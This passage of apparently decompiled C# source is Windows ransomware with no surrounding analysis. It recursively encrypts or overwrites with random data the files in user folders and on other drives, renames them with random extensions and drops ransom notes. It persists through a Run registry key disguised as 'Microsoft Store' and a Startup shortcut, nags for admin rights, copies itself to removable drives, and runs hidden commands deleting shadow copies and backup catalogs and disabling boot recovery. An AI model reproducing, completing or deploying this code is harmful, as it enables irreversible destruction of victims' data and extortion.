		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>zt4zOAHuQMZIjwFCMp0ECBcvQYEpQSpqlZ66rH5Ri81ipBfdWcWhVGmWrTQaaS+VBt4PUSiq5RltJgSL8+B2ba0bYgum9H6IK0YsO3UmBwJRr7QBMJb0bFfoO3ubFeQwHY3Fjjdu8oKx1OaYY5u06cN1YeBKi064IDY8S0vh490=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
